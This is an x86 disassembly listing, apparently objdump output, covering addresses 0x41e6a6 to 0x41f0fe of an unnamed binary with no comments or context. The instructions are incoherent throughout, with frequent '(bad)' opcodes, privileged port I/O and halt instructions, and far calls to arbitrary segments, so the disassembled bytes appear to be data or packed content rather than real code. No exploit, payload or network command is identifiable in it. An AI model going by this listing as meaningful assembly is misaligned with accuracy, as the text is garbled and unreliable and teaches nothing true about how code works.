  41e6a6:	inc    edx
  41e6a7:	or     bl,ah
  41e6a9:	js     0x41e685
  41e6ab:	jle    0x41e6b9
  41e6ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ae:	gs push ds
  41e6b0:	fld    QWORD PTR [ebx+eax*2-0x2112b281]
  41e6b7:	nop
  41e6b8:	add    BYTE PTR [ecx+0x2f],0xe
  41e6bc:	add    al,0x87
  41e6be:	adc    eax,0x77bf91
	...
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx+0x57f99f7c]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    BYTE PTR [eax],dl
  41e74d:	jecxz  0x41e7b4
  41e74f:	(bad)  
  41e750:	xchg   ebx,eax
  41e751:	enter  0xe6ec,0x13
  41e755:	shl    DWORD PTR [ecx+0x21d7f411],0xd7
  41e75c:	sahf   
  41e75d:	(bad)  
  41e75e:	loop   0x41e78d
  41e760:	cwde   
  41e761:	repz inc eax
  41e763:	mov    esp,DWORD PTR [edi-0x40740b26]
  41e769:	scas   al,BYTE PTR es:[edi]
  41e76a:	and    ch,BYTE PTR [edi-0x45]
  41e76d:	clc    
  41e76e:	dec    eax
  41e76f:	dec    edi
  41e770:	punpckldq mm1,mm1
  41e773:	fdivr  QWORD PTR [ecx-0x59]
  41e776:	imul   edx,DWORD PTR [edi-0x4c],0x5ea554bb
  41e77d:	aas    
  41e77e:	xor    ebp,DWORD PTR [ebp-0xf2789a8]
  41e784:	adc    eax,0x536164d4
  41e789:	bound  edx,QWORD PTR [eax-0x3c]
  41e78c:	je     0x41e728
  41e78e:	dec    esp
  41e78f:	or     DWORD PTR [ecx-0x32dd2c9e],esi
  41e795:	imul   ecx,DWORD PTR [esi-0x6],0x444a279c
  41e79c:	add    cl,0xae
  41e79f:	cmp    dl,BYTE PTR [ecx+0x3d922c6c]
  41e7a5:	lods   al,BYTE PTR ds:[esi]
  41e7a6:	cmp    al,0xe
  41e7a8:	mov    esp,0x13e62e19
  41e7ad:	in     eax,dx
  41e7ae:	das    
  41e7af:	(bad)  
  41e7b2:	push   edi
  41e7b3:	mov    edi,0x9f6a11
  41e7b8:	and    eax,0x6bb3b62e
  41e7bd:	or     ecx,DWORD PTR [esi]
  41e7bf:	add    esp,ebx
  41e7c1:	fcmovne st,st(1)
  41e7c3:	jl     0x41e7e7
  41e7c5:	mov    ds:0x72347896,eax
  41e7ca:	mov    bh,0xbc
  41e7cc:	adc    bl,BYTE PTR [si]
  41e7cf:	fucomi st,st(0)
  41e7d1:	outs   dx,DWORD PTR ds:[esi]
  41e7d2:	mov    dh,0xef
  41e7d4:	adc    BYTE PTR [esi],bl
  41e7d6:	mov    eax,ds:0x7437f944
  41e7db:	sbb    eax,0xa2fc0f27
  41e7e0:	xchg   esi,eax
  41e7e1:	mov    dl,0x6a
  41e7e3:	or     BYTE PTR [edx],cl
  41e7e5:	xlat   BYTE PTR ds:[ebx]
  41e7e6:	add    esi,DWORD PTR [ecx+0x1810fc2d]
  41e7ec:	js     0x41e782
  41e7ee:	and    eax,0x98a358e2
  41e7f3:	(bad)
  41e7f6:	popf   
  41e7f7:	imul   esp,edx,0x76172a0
  41e7fd:	mov    esi,0x669c58d5
  41e802:	push   ebp
  41e803:	cli    
  41e804:	jle    0x41e7fe
  41e806:	adc    al,0x14
  41e808:	fiadd  WORD PTR [ebx]
  41e80a:	sbb    eax,0xecb5c7d8
  41e80f:	xor    BYTE PTR [esi+ecx*4],al
  41e812:	jg     0x41e7ad
  41e814:	jo     0x41e7f2
  41e816:	outs   dx,BYTE PTR ds:[esi]
  41e817:	lods   al,BYTE PTR ds:[esi]
  41e818:	inc    DWORD PTR [eax]
  41e81a:	push   esi
  41e81b:	sub    DWORD PTR [esi+0x674a57b4],edi
  41e821:	ficom  WORD PTR [edi]
  41e823:	aam    0x5c
  41e825:	jmp    0x523a4bf
  41e82a:	dec    ebx
  41e82b:	adc    edx,esi
  41e82d:	add    DWORD PTR [ebx+esi*2],ecx
  41e830:	mov    ecx,0x4811108a
  41e835:	jge    0x41e8a5
  41e837:	mov    edi,0x395734dd
  41e83c:	pop    ds
  41e83d:	jge    0x41e870
  41e83f:	push   ds
  41e840:	mov    ch,0xdd
	...
  41e8b2:	add    BYTE PTR [eax],al
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	sbb    dh,cl
  41e8c2:	jp     0x41e8a0
  41e8c4:	xchg   BYTE PTR [eax+0x1],cl
  41e8c7:	add    dh,dh
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [ecx],dh
  41e8cd:	test   eax,0x1a5c7d69
  41e8d2:	sbb    bh,cl
  41e8d4:	in     eax,dx
  41e8d5:	mov    edi,0x359b2de1
  41e8da:	xor    al,0x15
  41e8dc:	mov    ebp,0x143bf027
  41e8e1:	dec    edi
  41e8e2:	xchg   esi,eax
  41e8e3:	jmp    0x41e92d
  41e8e5:	and    DWORD PTR [edi+eax*8+0x4b],edi
  41e8e9:	xchg   ebp,eax
  41e8ea:	cld    
  41e8eb:	pop    ebp
  41e8ec:	pop    esp
  41e8ed:	retf   0xda25
  41e8f0:	mov    dh,0xf7
  41e8f2:	in     al,dx
  41e8f3:	xchg   esp,eax
  41e8f4:	pop    edi
  41e8f5:	jp     0x41e8b9
  41e8f7:	pusha  
  41e8f8:	call   0x95384b09
  41e8fd:	pop    ss
  41e8fe:	dec    ebp
  41e8ff:	pop    edi
  41e900:	mov    esi,0xb6befdfb
  41e905:	jge    0x41e8fe
  41e907:	mov    WORD PTR [ebx+ebp*2-0x37],gs
  41e90b:	stc    
  41e90c:	hlt    
  41e90d:	dec    ebx
  41e90e:	cwde   
  41e90f:	xchg   edi,eax
  41e910:	jle    0x41e971
  41e912:	call   0xeec8:0xb7665d00
  41e919:	shl    DWORD PTR ds:0x20b2bb22,1
  41e91f:	neg    BYTE PTR [edx+ebx*4+0x2faed699]
  41e926:	dec    eax
  41e927:	fistp  DWORD PTR [ebp+0x27]
  41e92a:	inc    esi
  41e92b:	(bad)  
  41e92c:	inc    edx
  41e92d:	dec    edi
  41e92e:	in     al,dx
  41e92f:	xor    ebp,DWORD PTR [ebp-0x37ea442e]
  41e935:	retf   
  41e936:	imul   edi,eax,0x40
  41e939:	dec    esp
  41e93a:	and    ecx,ecx
  41e93c:	dec    edi
  41e93d:	imul   ecx,edx,0xffffffd6
  41e940:	cmc    
  41e941:	cmc    
  41e942:	aam    0x99
  41e944:	outs   dx,BYTE PTR ds:[esi]
  41e945:	xchg   ebp,eax
  41e946:	cmp    cl,BYTE PTR [edx-0x74ef0fc]
  41e94c:	cmp    eax,0x67ed4025
  41e951:	sbb    al,0xf7
  41e953:	dec    ebp
  41e954:	push   DWORD PTR [esi+0x1c]
  41e957:	mov    ecx,es
  41e959:	aas    
  41e95a:	dec    ebx
  41e95b:	xor    edx,ecx
  41e95d:	dec    esp
  41e95e:	push   esi
  41e95f:	inc    edx
  41e960:	mov    BYTE PTR [eax+0x2b],dh
  41e963:	lahf   
  41e964:	loopne 0x41e942
  41e966:	ret    
  41e967:	push   ebx
  41e968:	sub    BYTE PTR [edx],ah
  41e96a:	ret    
  41e96b:	dec    esp
  41e96c:	jnp    0x41e978
  41e96e:	gs mov al,0x9e
  41e971:	pop    eax
  41e972:	sbb    al,0x7b
  41e974:	lea    ecx,[esi+esi*1]
  41e977:	sbb    al,0xf0
  41e979:	or     bl,BYTE PTR [eax-0xf]
  41e97c:	adc    DWORD PTR [ebp+0x2084ee3c],edx
  41e982:	inc    esp
  41e983:	mov    ebx,0x11f42c49
  41e988:	pop    esi
  41e989:	cli    
  41e98a:	int    0x7
  41e98c:	fist   DWORD PTR [eax+0x7f]
  41e98f:	cwde   
  41e990:	jecxz  0x41e941
  41e992:	or     al,0xd2
  41e994:	cmp    ecx,0x112394c5
  41e99a:	push   esp
  41e99b:	add    DWORD PTR [edx+0x31dda269],edx
  41e9a1:	mov    dh,0xf5
  41e9a3:	mov    cl,0xf5
  41e9a5:	or     al,0xc9
  41e9a7:	mov    bl,0x65
  41e9a9:	mov    ss,eax
  41e9ab:	xchg   ah,dl
  41e9ad:	mov    bl,BYTE PTR [edi-0x4a]
  41e9b0:	fsub   QWORD PTR [edi+0xc]
  41e9b3:	add    al,0x17
  41e9b5:	(bad)  
  41e9b6:	stc    
  41e9b7:	push   edi
  41e9b8:	mov    ds:0x2fedad3e,al
  41e9bd:	mov    dh,0xad
  41e9bf:	mov    DWORD PTR [ebx],0x9c
	...
  41ea31:	add    BYTE PTR [eax],al
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fstp   QWORD PTR [edx+0x7c8472a4]
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	test   BYTE PTR [eax],0x0
  41ea4b:	add    bl,al
  41ea4d:	sub    al,0xd
  41ea4f:	daa    
  41ea50:	mov    cl,0xdd
  41ea52:	popf   
  41ea53:	jbe    0x41eaaa
  41ea55:	or     al,0x6e
  41ea57:	jno    0x41ea00
  41ea59:	sub    bl,bl
  41ea5b:	jbe    0x41e9de
  41ea5d:	jle    0x41eab9
  41ea5f:	std    
  41ea60:	(bad)  
  41ea61:	iret   
  41ea62:	or     al,0x4d
  41ea64:	pop    ebp
  41ea65:	ror    BYTE PTR [esi-0x623ec9a9],1
  41ea6b:	sub    bl,bl
  41ea6d:	sub    edi,DWORD PTR ds:0x926e228
  41ea73:	shr    BYTE PTR [eax+0x2f004425],1
  41ea79:	(bad)  
  41ea7a:	repz sbb edi,DWORD PTR [ebp+0x82c894e]
  41ea81:	out    0xbb,al
  41ea83:	jb     0x41eac8
  41ea85:	ror    DWORD PTR [esp+ebx*4-0x33],1
  41ea89:	loop   0x41ea46
  41ea8b:	fwait
  41ea8c:	cli    
  41ea8d:	into   
  41ea8e:	inc    eax
  41ea8f:	inc    edi
  41ea90:	xchg   BYTE PTR [edx-0x57],dl
  41ea93:	in     eax,0xa5
  41ea95:	push   eax
  41ea96:	ret    0x270
  41ea99:	mov    edx,0x49ec1443
  41ea9e:	(bad)  
  41ea9f:	shl    BYTE PTR [edi+0x19],1
  41eaa2:	test   al,0x48
  41eaa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa5:	jmp    0x187ca910
  41eaaa:	int3   
  41eaab:	fucom  st(7)
  41eaad:	call   0x91b26151
  41eab2:	mov    ch,0xf1
  41eab4:	mov    es,WORD PTR [ebp-0x491d9002]
  41eaba:	jl     0x41ea7b
  41eabc:	mov    dl,0xb9
  41eabe:	mov    edx,0xc37dc0b
  41eac3:	sub    DWORD PTR [ebx],edi
  41eac5:	cmp    BYTE PTR [ebp+0x41],bh
  41eac8:	mov    bl,BYTE PTR [ebx]
  41eaca:	mov    ah,0xef
  41eacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eacd:	fild   QWORD PTR [edi]
  41eacf:	sbb    BYTE PTR [esp+eax*4-0x15f47459],ah
  41ead6:	sub    esi,DWORD PTR [edx]
  41ead8:	push   es
  41ead9:	and    al,BYTE PTR [ebp-0xbf68691]
  41eadf:	add    eax,0x3e283b98
  41eae4:	(bad)  
  41eae5:	stos   BYTE PTR es:[edi],al
  41eae6:	fiadd  DWORD PTR [eax+0x66]
  41eae9:	adc    eax,DWORD PTR [ebx]
  41eaeb:	enter  0xa0f7,0x38
  41eaef:	inc    edi
  41eaf0:	push   edx
  41eaf1:	outs   dx,BYTE PTR ds:[esi]
  41eaf2:	adc    al,0xaf
  41eaf4:	and    DWORD PTR [ecx+ebp*2],0x444fb8be
  41eafb:	popf   
  41eafc:	mov    esi,0xdaf3dcb3
  41eb01:	and    eax,0x27b6c5d5
  41eb06:	and    al,0xb
  41eb08:	scas   al,BYTE PTR es:[edi]
  41eb09:	xchg   edx,eax
  41eb0a:	inc    esi
  41eb0b:	je     0x41eb56
  41eb0d:	xor    eax,0x7bc13156
  41eb12:	cmp    edi,DWORD PTR [eax]
  41eb14:	sub    DWORD PTR ds:0xac3b791c,edx
  41eb1a:	aam    0xc1
  41eb1c:	mov    ebp,0xe03582e4
  41eb21:	jbe    0x41eadc
  41eb23:	out    dx,eax
  41eb24:	sahf   
  41eb25:	pushf  
  41eb26:	or     eax,0x6e74ce48
  41eb2b:	cmp    DWORD PTR [ecx],ebp
  41eb2d:	jae    0x41eae1
  41eb2f:	push   ebp
  41eb30:	or     edx,ebp
  41eb32:	leave  
  41eb33:	jp     0x41eb46
  41eb35:	adc    ah,bl
  41eb37:	mov    ch,bh
  41eb39:	scas   al,BYTE PTR es:[edi]
  41eb3a:	int3   
  41eb3b:	pop    ecx
  41eb3c:	sub    eax,0xca1ddd09
  41eb41:	inc    DWORD PTR [eax]
	...
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	cmp    al,0x18
  41ebc2:	outs   dx,DWORD PTR ds:[esi]
  41ebc3:	cmp    dh,BYTE PTR [edx+0x4a]
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	test   BYTE PTR [eax],0x0
  41ebcb:	add    dh,dh
  41ebcd:	mov    edx,0x51239b32
  41ebd2:	sbb    BYTE PTR es:[esi+0x3f],dh
  41ebd6:	mov    edx,DWORD PTR [ecx]
  41ebd8:	jl     0x41eb91
  41ebda:	in     eax,dx
  41ebdb:	xor    al,0xbf
  41ebdd:	xchg   BYTE PTR [eax-0x697b1aed],ah
  41ebe3:	add    BYTE PTR [eax+0x2],0xbe
  41ebe7:	fs add eax,0x6f13285
  41ebed:	mov    bh,0xe7
  41ebef:	imul   ebp,DWORD PTR [ecx-0x40],0x1152cef7
  41ebf6:	or     DWORD PTR [ecx-0x6a],ebp
  41ebf9:	jmp    0xac22:0x366082d2
  41ec00:	aas    
  41ec01:	out    dx,eax
  41ec02:	popa   
  41ec03:	fsub   QWORD PTR [ebx+0x56]
  41ec06:	mov    bl,0x65
  41ec08:	in     eax,dx
  41ec09:	sub    al,0x91
  41ec0b:	pop    ss
  41ec0c:	mov    bh,dh
  41ec0e:	mov    ch,0x77
  41ec10:	adc    DWORD PTR [ebp-0x2bffba8e],esp
  41ec16:	cmp    al,0x5b
  41ec18:	jecxz  0x41ec3d
  41ec1a:	cmp    eax,0x52f08d5f
  41ec1f:	mov    bl,0x5
  41ec21:	into   
  41ec22:	cwde   
  41ec23:	call   0x77d82ecf
  41ec28:	jo     0x41eca1
  41ec2a:	push   ebx
  41ec2b:	nop
  41ec2c:	clc    
  41ec2d:	or     eax,0x390e8b3a
  41ec32:	xor    BYTE PTR [edi-0x7e159c49],0x97
  41ec39:	add    eax,DWORD PTR [ecx]
  41ec3b:	popf   
  41ec3c:	inc    esp
  41ec3d:	xor    ah,BYTE PTR [ebx-0x4a9fac61]
  41ec43:	xor    dh,BYTE PTR [ecx+0x5c1cd8db]
  41ec49:	add    DWORD PTR [ebx+0x41],esi
  41ec4c:	loopne 0x41ecb7
  41ec4e:	inc    edi
  41ec4f:	cdq    
  41ec50:	pushf  
  41ec51:	enter  0x55cc,0x51
  41ec55:	mov    WORD PTR [esp+esi*2-0x51],ds
  41ec59:	dec    ebx
  41ec5a:	retf   
  41ec5b:	cmp    bl,bh
  41ec5d:	dec    edx
  41ec5e:	jne    0x41ec0c
  41ec60:	loopne 0x41ec6c
  41ec62:	stos   DWORD PTR es:[edi],eax
  41ec63:	push   ebx
  41ec64:	dec    edi
  41ec65:	xchg   ebx,eax
  41ec66:	das    
  41ec67:	rcr    DWORD PTR [edx-0x34],0x49
  41ec6b:	jns    0x41ec28
  41ec6d:	inc    edx
  41ec6e:	into   
  41ec6f:	xchg   esi,eax
  41ec70:	jp     0x41ecef
  41ec72:	rcl    bh,cl
  41ec74:	leave  
  41ec75:	jb     0x41ebfb
  41ec77:	fisttp WORD PTR [ebx-0x27]
  41ec7a:	cmc    
  41ec7b:	cmp    ah,BYTE PTR [esp+ebx*2-0x36ff0099]
  41ec82:	jecxz  0x41ec85
  41ec84:	pop    ebx
  41ec85:	das    
  41ec86:	daa    
  41ec87:	pop    eax
  41ec88:	cmp    DWORD PTR [edi+0xa],0xffffffc5
  41ec8c:	hlt    
  41ec8d:	dec    esp
  41ec8e:	mov    bl,BYTE PTR [edi+0x3282e383]
  41ec94:	fwait
  41ec95:	or     ch,al
  41ec97:	imul   esi,eax,0x71f7a326
  41ec9d:	lahf   
  41ec9e:	cdq    
  41ec9f:	pop    ds
  41eca0:	stos   DWORD PTR es:[edi],eax
  41eca1:	mov    edx,0x41a650ec
  41eca6:	repnz add DWORD PTR [ebx-0x1bf9c1f8],esp
  41ecad:	jle    0x41eca0
  41ecaf:	rol    DWORD PTR [esi+0x46e61c02],0xc5
  41ecb6:	mov    ds:0xd6eb9aba,eax
  41ecbb:	or     al,0xda
  41ecbd:	scas   eax,DWORD PTR es:[edi]
  41ecbe:	scas   al,BYTE PTR es:[edi]
  41ecbf:	jnp    0x41ecc7
  41ecc1:	fadd   DWORD PTR [eax]
	...
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	xchg   esi,eax
  41ed41:	fsubr  DWORD PTR [edx+esi*8]
  41ed44:	push   0xf600014b
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    ch,dl
  41ed4d:	sub    BYTE PTR [edi+0x4f],bh
  41ed50:	or     eax,0xc8072928
  41ed55:	mov    ch,0x97
  41ed57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed58:	inc    ebp
  41ed59:	mov    dh,0xd1
  41ed5b:	pop    eax
  41ed5c:	inc    edi
  41ed5d:	or     BYTE PTR [ebx+esi*8-0x20c81dca],bl
  41ed64:	inc    ebx
  41ed65:	mov    al,0x55
  41ed67:	cmc    
  41ed68:	push   ebx
  41ed69:	int3   
  41ed6a:	mov    dl,0xad
  41ed6c:	add    eax,0x1aa5d7bf
  41ed71:	fisttp WORD PTR [ecx]
  41ed73:	div    BYTE PTR [ecx+0x7a]
  41ed76:	sti    
  41ed77:	inc    esp
  41ed78:	fstp   QWORD PTR [esi]
  41ed7a:	sub    eax,0x934af5d0
  41ed7f:	call   DWORD PTR [ebx-0x5]
  41ed82:	outs   dx,BYTE PTR ds:[esi]
  41ed83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed84:	dec    edi
  41ed85:	dec    ebp
  41ed86:	cmp    BYTE PTR [edx+0x50],dh
  41ed89:	ins    BYTE PTR es:[edi],dx
  41ed8a:	ret    
  41ed8b:	adc    ch,BYTE PTR [esi+0x36eb577a]
  41ed91:	cmp    DWORD PTR [ebp+0x71386cf5],ebx
  41ed97:	dec    eax
  41ed98:	mov    eax,0x82a7a2d9
  41ed9d:	int3   
  41ed9e:	in     al,0x23
  41eda0:	xor    dl,BYTE PTR ds:0xa8764554
  41eda6:	jns    0x41edd3
  41eda8:	sbb    bh,BYTE PTR [edi+edi*4+0x21]
  41edac:	mov    esi,0x9ca47b0a
  41edb1:	mov    ebp,0x4f82ba6d
  41edb6:	push   cs
  41edb7:	push   esi
  41edb8:	sbb    al,0xaf
  41edba:	cwde   
  41edbb:	inc    edx
  41edbc:	call   0xfb7070d1
  41edc1:	ss icebp 
  41edc3:	shl    DWORD PTR [ecx-0x73],cl
  41edc6:	inc    eax
  41edc7:	in     al,0x88
  41edc9:	jecxz  0x41edf4
  41edcb:	imul   ecx
  41edcd:	out    0xf8,eax
  41edcf:	mov    eax,ds:0xf62b4db
  41edd4:	into   
  41edd5:	cdq    
  41edd6:	inc    edi
  41edd7:	cmp    dl,al
  41edd9:	sbb    ah,ch
  41eddb:	rol    BYTE PTR [ebx+0x62],cl
  41edde:	(bad)  
  41ede0:	and    ecx,DWORD PTR [esi-0x1f]
  41ede3:	pop    esp
  41ede4:	sahf   
  41ede5:	int3   
  41ede6:	or     al,0x3e
  41ede8:	out    0x1a,al
  41edea:	fistp  QWORD PTR [edx]
  41edec:	mov    al,ds:0x40351a3a
  41edf1:	into   
  41edf2:	pop    ecx
  41edf3:	ss jmp 0x115d:0x91d5
  41edfa:	adc    eax,0xc2d0ef43
  41edff:	mov    ah,0x37
  41ee01:	mov    ebp,0x5485e75b
  41ee06:	mov    bh,al
  41ee08:	xor    dl,ah
  41ee0a:	or     DWORD PTR [ecx-0x6f8fcd8a],0xeaec65e4
  41ee14:	pop    ds
  41ee15:	ds cdq 
  41ee17:	inc    esp
  41ee18:	cmp    eax,0x2a3f5f94
  41ee1d:	mov    ah,BYTE PTR [edi]
  41ee1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee21:	fst    DWORD PTR [ebp+0x1]
  41ee24:	sub    esp,DWORD PTR [ecx+0x3fc12f36]
  41ee2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee2b:	push   ss
  41ee2c:	jmp    0x41ee8b
  41ee2e:	mov    bh,BYTE PTR [esi]
  41ee30:	std    
  41ee31:	sbb    bh,0x1d
  41ee34:	jne    0x41ee9e
  41ee36:	std    
  41ee37:	dec    ecx
  41ee38:	mov    ch,0x1f
  41ee3a:	out    0x47,eax
  41ee3c:	sar    DWORD PTR [ebx-0x74904a73],1
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	loop   0x41ee7d
  41eec2:	ss mov ebx,0x14c5e
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    cl,dh
  41eecd:	sub    BYTE PTR [esi-0x3b],cl
  41eed0:	cmp    DWORD PTR [edx+0xbd13ae9],ebp
  41eed6:	stos   DWORD PTR es:[edi],eax
  41eed7:	jns    0x41ee65
  41eed9:	xor    ebx,0xffffffe5
  41eedc:	aam    0xd2
  41eede:	addr16 (bad) 
  41eee0:	fcomp  st(1)
  41eee2:	mov    dl,0x28
  41eee4:	xchg   ecx,eax
  41eee5:	outs   dx,DWORD PTR ds:[esi]
  41eee6:	je     0x41ee9f
  41eee8:	std    
  41eee9:	out    dx,al
  41eeea:	dec    edi
  41eeeb:	out    dx,eax
  41eeec:	mov    ch,0x10
  41eeee:	jl     0x41eea1
  41eef0:	xchg   DWORD PTR [edi-0x6b70aa87],ebx
  41eef6:	add    ecx,esi
  41eef8:	jle    0x41eed9
  41eefa:	call   0xf5ad:0x7d86c3dd
  41ef01:	ins    BYTE PTR es:[edi],dx
  41ef02:	arpl   WORD PTR [ebx-0x1b],cx
  41ef05:	call   DWORD PTR [edi-0x5e8b49ad]
  41ef0b:	sahf   
  41ef0c:	cmp    BYTE PTR ss:[edx],dl
  41ef0f:	enter  0xc14d,0x11
  41ef13:	das    
  41ef14:	pop    es
  41ef15:	(bad)  
  41ef16:	cwde   
  41ef17:	add    bl,dl
  41ef19:	jo     0x41ef87
  41ef1b:	arpl   WORD PTR [edi+edi*1-0x19],di
  41ef1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef20:	mov    bl,0xdd
  41ef22:	xor    edi,DWORD PTR [ebx]
  41ef24:	sar    BYTE PTR [ecx+0x4864471f],1
  41ef2a:	sub    DWORD PTR ds:0x3861037d,esi
  41ef30:	mov    BYTE PTR [ebp-0x130c4dd0],al
  41ef36:	dec    ebp
  41ef37:	pop    ds
  41ef38:	add    dl,bh
  41ef3a:	mov    ds:0x8427a3f4,eax
  41ef3f:	cmp    eax,0xf28ebb17
  41ef44:	clc    
  41ef45:	mov    cl,0xb6
  41ef47:	xor    bh,ah
  41ef49:	rcl    DWORD PTR [esi+eiz*1],cl
  41ef4c:	inc    eax
  41ef4d:	push   esp
  41ef4e:	push   cs
  41ef4f:	fldcw  WORD PTR [ebp+0x651098b6]
  41ef55:	and    BYTE PTR [esi],0x2f
  41ef58:	inc    BYTE PTR [eax-0x56455263]
  41ef5e:	and    eax,0xf44a58ee
  41ef63:	test   al,0xce
  41ef65:	and    BYTE PTR [esi],dh
  41ef67:	cs jecxz 0x41ef6c
  41ef6a:	mov    edx,0xd64b2faa
  41ef6f:	stos   DWORD PTR es:[edi],eax
  41ef70:	xor    DWORD PTR [esi],0x3969c636
  41ef76:	aas    
  41ef77:	inc    edi
  41ef78:	xor    esi,DWORD PTR [ebx]
  41ef7a:	js     0x41ef50
  41ef7c:	daa    
  41ef7d:	mov    DWORD PTR [ecx+0x4f4961cc],ebp
  41ef83:	popf   
  41ef84:	cld    
  41ef85:	ins    DWORD PTR es:[edi],dx
  41ef86:	sar    BYTE PTR [edi+edx*8-0x42],1
  41ef8a:	mov    al,BYTE PTR [esi]
  41ef8c:	cmp    DWORD PTR [ebp-0x70],ebp
  41ef8f:	xchg   DWORD PTR [edx+0x64d93e9f],eax
  41ef95:	push   0xffffffb8
  41ef97:	mov    cl,0xf0
  41ef99:	call   0x6635:0xf732bd53
  41efa0:	adc    BYTE PTR [ebp-0x5f],al
  41efa3:	pop    ecx
  41efa4:	sti    
  41efa5:	mov    ds:0x78c93cf5,eax
  41efaa:	push   0xfffffff9
  41efac:	jp     0x41f01e
  41efae:	dec    esi
  41efaf:	pop    ds
  41efb0:	mov    bl,0x15
  41efb2:	fisttp QWORD PTR [ecx]
  41efb4:	push   cs
  41efb5:	mov    ds:0xa9af8f20,al
  41efba:	mov    ds:0x4f1e27b6,eax
  41efbf:	lods   al,BYTE PTR ds:[esi]
  41efc0:	les    ecx,FWORD PTR [esi+0x0]
	...
  41f032:	add    BYTE PTR [eax],al
  41f034:	dec    edi
  41f035:	push   ebx
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x12]
  41f041:	cmp    edi,eax
  41f043:	test   eax,0x14d54
  41f048:	test   BYTE PTR [eax],0x0
  41f04b:	add    BYTE PTR [edi-0x57],ch
  41f04e:	sbb    esp,DWORD PTR [edi-0x6d7e9f8d]
  41f054:	mov    WORD PTR [ebp-0x6a4a9f18],gs
  41f05a:	lahf   
  41f05b:	sar    esp,1
  41f05d:	pop    edx
  41f05e:	dec    ebx
  41f05f:	and    eax,0x18e94a6c
  41f064:	bound  ebp,QWORD PTR [ebp+0x71]
  41f067:	lods   al,BYTE PTR ds:[esi]
  41f068:	fdiv   DWORD PTR [ecx-0x451eb06c]
  41f06e:	and    BYTE PTR [eax+0x639f84a1],al
  41f074:	add    WORD PTR [esi-0x77],sp
  41f078:	or     al,0xd3
  41f07a:	inc    eax
  41f07b:	gs stc 
  41f07d:	jbe    0x41f055
  41f07f:	pusha  
  41f080:	retf   0xe36f
  41f083:	mov    eax,0xd9fc7014
  41f088:	sbb    al,0x8a
  41f08a:	push   0x2b0cef93
  41f08f:	push   ebx
  41f090:	lea    edi,[ecx]
  41f092:	cs fucomp st(0)
  41f095:	mov    DWORD PTR [edi],0xf0ee6a91
  41f09b:	cmc    
  41f09c:	and    al,0x59
  41f09e:	(bad)  
  41f09f:	mov    dh,0xf0
  41f0a1:	xchg   edx,eax
  41f0a2:	sub    esi,DWORD PTR [ebp+0x2afd7b36]
  41f0a8:	aas    
  41f0a9:	leave  
  41f0aa:	test   dh,dl
  41f0ac:	push   edx
  41f0ad:	or     DWORD PTR [eax-0x61],edi
  41f0b0:	cmp    DWORD PTR [edx],ebp
  41f0b2:	sub    al,0x69
  41f0b4:	adc    dh,dh
  41f0b6:	mov    WORD PTR [ebp-0x41],bx
  41f0ba:	sbb    bh,dl
  41f0bc:	mov    bl,BYTE PTR ds:0x7f2c192e
  41f0c2:	rcl    cl,0x45
  41f0c5:	imul   edx,DWORD PTR [edi+0xdf669c7],0x49
  41f0cc:	shl    BYTE PTR [ecx],cl
  41f0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cf:	sti    
  41f0d0:	nop
  41f0d1:	mov    ebp,0x54144b55
  41f0d6:	(bad)  
  41f0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d8:	repnz sahf 
  41f0da:	cwde   
  41f0db:	pop    ss
  41f0dc:	mov    ebx,0x8d039b68
  41f0e1:	or     BYTE PTR ss:[esi],cl
  41f0e4:	mov    bl,0x9b
  41f0e6:	test   al,0x48
  41f0e8:	test   eax,0x41bd8ebc
  41f0ed:	vaddsubps xmm0,xmm2,XMMWORD PTR [ebp+0x2dce4354]
  41f0f5:	(bad)  
  41f0f6:	in     eax,dx
  41f0f7:	call   0x876dd443
  41f0fc:	dec    eax
  41f0fd:	in     al,dx
  41f0fe:	inc    ebx
